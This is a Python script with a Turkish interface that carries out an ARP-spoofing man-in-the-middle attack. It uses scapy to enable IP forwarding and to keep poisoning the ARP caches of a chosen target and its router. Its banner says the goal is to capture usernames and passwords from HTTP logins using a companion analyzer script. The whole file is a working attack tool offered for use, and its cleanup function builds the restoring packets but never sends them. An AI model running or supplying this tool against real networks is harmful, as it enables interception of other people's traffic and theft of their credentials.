import os
import time
import scapy.all as scapy
import optparse

os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
print("""  
                        |--------------------------------------|
                        |        M1dB0th'a Hos Geldiniz.       |
                        |       Developed By SweatherX         |
                        |--------------------------------------|
    Kullanım:
            -t veya --target [Hedef IP], -r veya --host [Hedef Modem IP]
            Çıkış: Ctrl+C
                 
                 
    Not:         
            MITM saldırısını başlatmadan önce "datanlyzer.py" dosyasını açınız.
            Eğer hedef http bir siteye girip login olursa kullanıcı adı ve şifre "datanlyzer.py" dosyasında gözükür.  
    """)
def giris():
    parse = optparse.OptionParser()

    parse.add_option("-t","--target",dest="hedef_ip",help="Hedef ip giriniz.")
    parse.add_option("-r","--host",dest="modem_ip",help="Modem ip giriniz")

    ayarlar = parse.parse_args()[0]

    if not ayarlar.hedef_ip:
        print("Hedef ip giriniz.")
    if not ayarlar.modem_ip:
        print("Hedef modem ip'sini giriniz")
    return ayarlar

def macbulucu(ip):
    istek_paket = scapy.ARP(pdst=ip)
    yayin_paket = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    paket = yayin_paket/istek_paket
    asilpaket = scapy.srp(paket,timeout=1,verbose=False)[0]
    return asilpaket[0][1].hwsrc

def arpas(ip1,ip2):
    macbulduk = macbulucu(ip1)
    arp_as = scapy.ARP(op=2,pdst=ip1,hwdst=macbulduk,psrc=ip2)
    scapy.send(arp_as,verbose=False)
def reset(ip11,ip22):
    macbulduk = macbulucu(ip11)
    digermac = macbulucu(ip22)
    arp_as = scapy.ARP(op=2,pdst=ip11,hwdst=macbulduk,psrc=ip22,hwsrc=digermac)
sayac=0

girdi = giris()
hedef = girdi.hedef_ip
modem = girdi.modem_ip

try:
    while True:

        arpas(hedef,modem)
        arpas(modem,hedef)

        sayac += 2
        print("\rGönderilen Paket : "+ str(sayac),end="")
        time.sleep(1)

except KeyboardInterrupt :
    print("\nÇıkış Yapılıyor...")
    reset(hedef,modem)
    reset(modem,hedef)


